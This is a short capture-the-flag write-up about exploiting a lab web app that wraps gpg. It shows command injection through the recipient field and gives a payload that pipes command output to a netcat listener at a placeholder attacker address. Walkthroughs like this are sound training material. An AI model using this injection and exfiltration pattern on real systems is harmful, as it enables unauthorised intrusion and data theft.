After pivoting through their internal network, we have found yet another encryption tool. Can you hack into the server and extract the secret data? Our intel tells us that the app is using the gpg tool.
Start the machine below and access the web app at `http://MACHINE_IP:5000`.

---

- To encrypt files, the website uses the `gpg` tool (we know this from the response file extension)
![](https://github.com/zakaria-mghili/writeups_HackfinityBattle_2025/blob/25a65387985cdb01ce7a6505b166a3edb4a56fa7/img/2025-03-25%2023_28_13-DarkMatter%20Encryptor%20-%20Brave.png)

- The website is vulnerable to command injection into the `recipient`
- the website first check if the recipient is a one from the list. so in malicious command we should use recipient like Cipher or another from list Then use `;` to separate it from our command.
- We add a malicious command that consists of two parts: one containing standard commands like `ls` or `cat`... and another using the `netcat` tool. We combine them using piping:  `Cipher ; malicious_command | nc YOUR_IP_ADDR 4444 ;`
- we can use burp suite to edit recipient input.
- Before send the payload, you need to set up a `Netcat listener` to receive the exfiltrated data.



![[2025-03-25 23_55_52-kali-linux-2024.4-vmware-amd64 - VMware Workstation.png]]

>response 

![[2025-03-26 00_01_17-kali-linux-2024.4-vmware-amd64 - VMware Workstation.png]]
> the exploitation is work and , we find the flag file , now we need just to `cat` content of flag file

![[2025-03-26 00_04_09-kali-linux-2024.4-vmware-amd64 - VMware Workstation.png]]

![[2025-03-26 00_05_32-kali-linux-2024.4-vmware-amd64 - VMware Workstation.png]]




